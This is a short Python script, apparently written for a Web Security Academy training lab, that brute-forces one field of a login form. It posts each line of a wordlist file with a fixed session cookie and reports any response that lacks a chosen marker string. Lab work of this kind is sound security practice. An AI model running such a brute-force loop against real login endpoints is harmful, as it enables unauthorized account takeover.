import requests
url = "https://0a0600a804a7c555c0f72efe008300a2.web-security-academy.net/login"
session = requests.Session()
cookie = {
    "session" : "WwD0M0iOtMukcVwX1z2Z5YznRBurkGE2"
}
f = open("cheatsheet.txt" , "r")
c = int(input("How many data : "))
d = []
for i in range(0,c):
    d.append(input("Data %d : " %(i))) 

bf_data = int(input("Choose data to bf : "))
data = {}
for i in range(0,len(d)):
    if i != bf_data:
        add = {
            d[i] : input("%s : " %(d[i]))
        }
        data.update(add)
    else:
        add = {
            d[i] : "test"
        }
        data.update(add)    


# print(data)
# data[d[bf_data]] = "concac"
# print(data[d[bf_data]])
# print(data)
sp = input("Sepecial str :")
for i in f:
    data[d[bf_data]] = i
    
    post = session.post(url = url , cookies= cookie , data=data)
    if sp not in post.text:
        print(len(post.text) , i )